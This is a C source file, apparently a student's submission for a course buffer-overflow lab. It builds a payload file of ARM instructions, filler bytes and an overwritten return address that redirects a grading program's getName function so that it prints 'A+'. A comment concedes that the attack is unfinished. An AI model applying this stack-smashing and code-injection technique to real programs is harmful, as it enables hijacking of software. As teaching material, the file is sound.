/*--------------------------------------------------------------------*/
/* createdataB.c                                                      */
/* Author: Ishaan Javali and Jack Zhang                               */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include "miniassembler.h"


/* We believe that we have the correct logic for the A+ attack but struggled
to find a pointer to the format string %c. We planned to first move a pointer
to %c into w0, and then move 'A' into w1. We'd then bl printf, as we found
in the text section of the memory map and attempted in createdataAplus.c, with
w0 and w1 being the parameters. That would print out 'A'. We'd then follow, 
the exact same procedure for the A attack, but this time with the character
'+', adjusting the filler bytes and instruction addresses accordingly. The
main issue was not being able to find %c alone, since its address had %c and 
multiple characters following that, which we did not know how to remove. 
 */

/* 
main does not receive any parameters or input from stdin or 
other streams. It does not write to stdout. It uses fprintf 
to write 56 bytes to a file called dataAplus and returns 0.
 */
int main() {
    FILE *psFile;
    unsigned int movInstr, movAInstr, movFormatInstr;
    unsigned int blInstr;
    unsigned int strbInstr, adrInstr, bInstr;
    
    psFile = fopen("dataAplus", "w");
    
    /* Write 4 bytes */
    fprintf(psFile, "I&J");
    fprintf(psFile, "%c", '\0'); 

    /* Move 'A' into register 1 */
    movAInstr = MiniAssembler_mov(1, 'A');
    /* Attempt to move address of the format string
    "%c" into register 0 */
    movFormatInstr = MiniAssembler_mov(0, 0x400960);
    /* Call printf using registers 0 and 1. */
    blInstr = MiniAssembler_bl(0x400600, 0x420064);

    /* 'A attack' but with a '+' sign instead. 
    4 bytes per instruction. Total 16 bytes.*/
    movInstr = MiniAssembler_mov(0, '+');
    adrInstr = MiniAssembler_adr(1, 0x420044, 0x42006C);
    strbInstr = MiniAssembler_strb(0, 1);
    bInstr = MiniAssembler_b(0x400864, 0x420074);

    /* Write machine code instructions to input file */
    fwrite(&movAInstr, sizeof(unsigned int), 1, psFile);
    fwrite(&movFormatInstr, sizeof(unsigned int), 1, psFile);
    fwrite(&blInstr, sizeof(unsigned int), 1, psFile);
    fwrite(&movInstr, sizeof(unsigned int), 1, psFile);
    fwrite(&adrInstr, sizeof(unsigned int), 1, psFile);
    fwrite(&strbInstr, sizeof(unsigned int), 1, psFile);
    fwrite(&bInstr, sizeof(unsigned int), 1, psFile);
    
    /* 16 filler bytes */
    fprintf(psFile, "1234567812345678");

    /* Replace getName's return address
     with 0x42005C (address in BSS section where 
     machine code instructions begin*/
    fprintf(psFile, "%c", 0x5C);
    fprintf(psFile, "%c", 0x00);
    fprintf(psFile, "%c", 0x42);
    fprintf(psFile, "%c", 0x00);
    fprintf(psFile, "%c", 0x00);
    fprintf(psFile, "%c", 0x00);
    fprintf(psFile, "%c", 0x00);
    fprintf(psFile, "%c", 0x00);

    /* Close the file */
    fclose(psFile);
    return 0;
}